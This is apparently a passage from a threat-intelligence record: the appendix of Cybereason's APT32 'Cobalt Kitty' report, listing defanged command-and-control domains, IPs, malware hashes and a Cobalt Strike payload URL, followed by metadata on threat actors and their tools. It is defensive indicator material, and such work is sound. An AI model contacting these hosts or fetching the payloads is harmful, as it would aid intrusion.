support.chatconnecting(.)com (45.114.117.137)|File name: Flash.exe SHA-1: 01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09 Submitted: 2016-12-28 09:51:13|Link|\n|inbox.mailboxhus(.)com support.chatconnecting(.)com (45.114.117[.]137)|File name: Flash.exe SHA-1: 562aeced9f83657be218919d6f443485de8fae9e Submitted: 2017-01-18 19:00:41|Link|\n|support.chatconnecting(.)com (45.114.117[.]137)|URL: hxxp://support(.)chatconnecting.com/2nx7m Submitted: 2017-01-20 10:11:47|Link|\n|support.chatconnecting(.)com (45.114.117[.]137)|File name: ID2016.doc SHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc Submitted: 2016-11-23 08:18:43 Malicious Word document (Phishing text in Vietnamese)|Link|\n|blog(.)versign(.)info (23.227.196[.]210)|File name: tx32.dll SHA-1: 604a1e1a6210c96e50b72f025921385fad943ddf Submitted: 2016-08-15 04:04:46|Link|\n|blog(.)versign(.)info (23.227.196[.]210)|File name: Giấy yêu cầu bồi thường mới 2016 - Hằng.doc SHA-1: a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c Submitted: 2016-10-06 11:03:54 Malicious Word document with Phishing text in Vietnamese|Link|\n\n\n-----\n\n|blog(.)versign(.)info (23.227.196[.]210)|File name: Thong tin.doc SHA-1: a5fbcbc17a1a0a4538fd987291f8dafd17878e33 Submitted: 2016-10-25 Malicious Word document with Phishing text in Vietnamese|Link|\n|---|---|---|\n|Images.verginnet(.)info id.madsmans(.)com (176.107.176[.]6)|File name: WinWord.exe SHA-1: ea67b24720da7b4adb5c7a8a9e8f208806fbc198 Submitted: Cobalt Strike payload Downloads hxxp://images.verginnet(.)info/2NX7M Using Cobalt Strike malleable c2 oscp profile|Link|\n|tonholding(.)com nsquery(.)net|File name: SndVolSSO.exe SHA-1: 1fef52800fa9b752b98d3cbb8fff0c44046526aa Submitted: 2016-08-01 09:03:58 Denis Backdoor Variant|Link|\n|tonholding(.)com nsquery(.)net|File name: Xwizard / KB12345678.exe SHA-1: d48602c3c73e8e33162e87891fb36a35f621b09b Submitted: 2016-08-01|Link|\n|teriava(.)com|File name: CiscoEapFast.exe SHA-1: 77dd35901c0192e040deb9cc7a981733168afa74 Submitted: 2017-02-28 16:37:12 Denis Backdoor Variant|Link|\n\n\n###### Appendix B: Denis Backdoor samples in the wild\n\n**File name** **SHA-1** **Domain**\n\nmsprivs.exe 97fdab2832550b9fea80ec1b9 teriava(.)com\nc182f5139e9e947\n\nWerFault.exe F25d6a32aef1161c17830ea0c teriava(.)com\nb950e36b614280d\n\nmsprivs.exe 1878df8e9d8f3d432d0bc8520 teriava(.)com\n595b2adb952fb85\n\nCiscoEapFast.exe 1a2cd9b94a70440a962d9ad7 teriava(.)com,\n094.exe 8e5e46d7d22070d0 tulationeva(.)com,\n\n©2017 Cybereason Inc. All rights reserved. 13\n\n|File name|SHA-1|Domain|\n|---|---|---|\n|msprivs.exe|97fdab2832550b9fea80ec1b9 c182f5139e9e947|teriava(.)com|\n|WerFault.exe|F25d6a32aef1161c17830ea0c b950e36b614280d|teriava(.)com|\n|msprivs.exe|1878df8e9d8f3d432d0bc8520 595b2adb952fb85|teriava(.)com|\n|CiscoEapFast.exe 094.exe|1a2cd9b94a70440a962d9ad7 8e5e46d7d22070d0|teriava(.)com, tulationeva(.)com,|\n\n\n-----\n\n|Col1|Col2|notificeva(.)com|\n|---|---|---|\n|CiscoEapFast.exe|77dd35901c0192e040deb9cc 7a981733168afa74|teriava(.)com, tulationeva(.)com, notificeva(.)com|\n|SwUSB.exe F:\\malware\\Anh Dương\\lsma.exe|88d35332ad30964af4f55f1e44 c951b15a109832|gl-appspot(.)org tonholding(.)com nsquery(.)net|\n|Xwizard.exe KB12345678.exe|d48602c3c73e8e33162e8789 1fb36a35f621b09b|tonholding(.)com nsquery(.)net|\n|SndVolSSO.exe|1fef52800fa9b752b98d3cbb8ff f0c44046526aa|tonholding(.)com nsquery(.)net|\n\n\n©2017 Cybereason Inc. All rights reserved. 14\n\n\n-----\n\nCybereason is the leader in endpoint protection, offering endpoint detection and response, next-generation antivirus, and\n\nactive monitoring services. Founded by elite intelligence professionals born and bred in offense-first hunting, Cybereason gives\n\nenterprises the upper hand over cyber adversaries. The Cybereason platform is powered by a custom-built in-memory graph,\n\nthe only truly automated hunting engine anywhere. It detects behavioral patterns across every endpoint and surfaces malicious\n\noperations in an exceptionally user-friendly interface. Cybereason is privately held and headquartered in Boston with offices in\n\nLondon, Tel Aviv, and Tokyo.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
    ],
    "report_names": [
        "Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8386d4af-5cca-40bb-91d7-aca5d1a0ec99",
            "created_at": "2022-10-25T16:07:23.414558Z",
            "updated_at": "2025-03-27T02:02:09.787347Z",
            "deleted_at": null,
            "main_name": "Bookworm",
            "aliases": [],
            "source_name": "ETDA:Bookworm",
            "tools": [
                "Agent.dhwf",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "SPIVY",
                "Scieron",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "adfbe698-24b2-41fc-a701-781fef330b16",
            "created_at": "2024-01-09T02:00:04.17648Z",
            "updated_at": "2025-03-27T02:00:03.274931Z",
            "deleted_at": null,
            "main_name": "GREF",
            "aliases": [],
            "source_name": "MISPGALAXY:GREF",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2dfaa730-7079-494c-b2f0-3ff8f3598a51",
            "created_at": "2022-10-25T16:07:23.474746Z",
            "updated_at": "2025-03-27T02:02:09.822683Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "ATK 67",
                "Cobalt Gang",
                "Cobalt Spider",
                "Gold Kingswood",
                "Mule Libra",
                "TAG-CR3"
            ],
            "source_name": "ETDA:Cobalt Group",
            "tools": [
                "ATMRipper",
                "ATMSpitter",
                "Agentemis",
                "AmmyyRAT",
                "AtNow",
                "COOLPANTS",
                "CobInt",
                "Cobalt Strike",
                "CobaltStrike",
                "Cyst Downloader",
                "Fareit",
                "FlawedAmmyy",
                "Formbook",
                "Little Pig",
                "Metasploit Stager",
                "Mimikatz",
                "More_eggs",
                "NSIS",
                "Nullsoft Scriptable Install System",
                "Pony Loader",
                "Ripper ATM",
                "SDelete",
                "Siplog",
                "SoftPerfect Network Scanner",
                "SpicyOmelette",
                "Taurus Builder",
                "Taurus Builder Kit",
                "Taurus Loader",
                "Terra Loader",
                "ThreatKit",
                "VenomKit",
                "cobeacon",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "0a03e7f0-2f75-4153-9c4f-c46d12d3962e",
            "created_at": "2022-10-25T15:50:23.453824Z",
            "updated_at": "2025-03-27T02:00:55.473216Z",
            "deleted_at": null,
            "main_name": "Ke3chang",
            "aliases": [
                "Ke3chang",
                "APT15",
                "Vixen Panda",
                "GREF",
                "Playful Dragon",
                "RoyalAPT",
                "Nylon Typhoon"
            ],
            "source_name": "MITRE:Ke3chang",
            "tools": [
                "Okrum",
                "Systeminfo",
                "netstat",
                "spwebmember",
                "Mimikatz",
                "Tasklist",
                "MirageFox",
                "Neoichor",
                "ipconfig"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ea1e0de-53b9-4059-802f-485884180701",
            "created_at": "2022-10-25T16:07:24.04846Z",
            "updated_at": "2025-03-27T02:02:10.090459Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "APT-C-09",
                "ATK 11",
                "Capricorn Organisation",
                "Chinastrats",
                "Dropping Elephant",
                "Maha Grass",
                "Quilted Tiger",
                "TG-4410",
                "Thirsty Gemini",
                "Zinc Emerson"
            ],
            "source_name": "ETDA:Patchwork",
            "tools": [
                "AndroRAT",
                "Artra Downloader",
                "ArtraDownloader",
                "AutoIt backdoor",
                "BADNEWS",
                "BIRDDOG",
                "Bahamut",
                "Bozok",
                "Bozok RAT",
                "Brute Ratel",
                "Brute Ratel C4",
                "CinaRAT",
                "Crypta",
                "ForeIT",
                "JakyllHyde",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "NDiskMonitor",
                "Nadrac",
                "PGoShell",
                "PowerSploit",
                "PubFantacy",
                "Quasar RAT",
                "QuasarRAT",
                "Ragnatela",
                "Ragnatela RAT",
                "SocksBot",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL",
                "Yggdrasil"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4b066585-3591-4ddd-b3cc-f4e19e0e00ef",
            "created_at": "2022-10-25T16:07:24.086915Z",
            "updated_at": "2025-03-27T02:02:10.103556Z",
            "deleted_at": null,
            "main_name": "Putter Panda",
            "aliases": [
                "APT 2",
                "Group 36",
                "Putter Panda",
                "SearchFire",
                "TG-6952"
            ],
            "source_name": "ETDA:Putter Panda",
            "tools": [
                "3PARA RAT",
                "4H RAT",
                "4h_rat",
                "MSUpdater",
                "httpclient",
                "pngdowner"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c11abba0-f5e8-4017-a4ee-acb1a7c8c242",
            "created_at": "2022-10-25T15:50:23.744036Z",
            "updated_at": "2025-03-27T02:00:55.537114Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "Cobalt Group",
                "GOLD KINGSWOOD",
                "Cobalt Gang",
                "Cobalt Spider"
            ],
            "source_name": "MITRE:Cobalt Group",
            "tools": [
                "Mimikatz",
                "More_eggs",
                "SpicyOmelette",
                "SDelete",
                "Cobalt Strike",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "17b1b76b-16da-4c4f-8b32-f6fede3eda8c",
            "created_at": "2022-10-25T16:07:23.750796Z",
            "updated_at": "2025-03-27T02:02:09.961401Z",
            "deleted_at": null,
            "main_name": "Ke3chang",
            "aliases": [
                "APT 15",
                "BackdoorDiplomacy",
                "Bronze Davenport",
                "Bronze Idlewood",
                "Bronze Palace",
                "CTG-9246",
                "GREF",
                "Ke3chang",
                "Metushy",
                "Nylon Typhoon",
                "Operation Ke3chang",
                "Operation MirageFox",
                "Playful Dragon",
                "Playful Taurus",
                "Red Vulture",
                "Royal APT",
                "Social Network Team",
                "Vixen Panda"
            ],
            "source_name": "ETDA:Ke3chang",
            "tools": [
                "Agentemis",
                "Anserin",
                "BS2005",
                "BleDoor",
                "CarbonSteal",
                "Cobalt Strike",
                "CobaltStrike",
                "DarthPusher",
                "DoubleAgent",
                "EternalBlue",
                "GoldenEagle",
                "Graphican",
                "HenBox",
                "HighNoon",
                "IRAFAU",
                "Ketrican",
                "Ketrum",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MS Exchange Tool",
                "Mebroot",
                "Mimikatz",
                "MirageFox",
                "NBTscan",
                "Okrum",
                "PluginPhantom",
                "PortQry",
                "ProcDump",
                "PsList",
                "Quarian",
                "RbDoor",
                "RibDoor",
                "Royal DNS",
                "RoyalCli",
                "RoyalDNS",
                "SAMRID",
                "SMBTouch",
                "SilkBean",
                "Sinowal",
                "SpyWaller",
                "Theola",
                "TidePool",
                "Torpig",
                "Turian",
                "Winnti",
                "XSLCmd",
                "cobeacon",
                "nbtscan",
                "netcat",
                "spwebmember"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
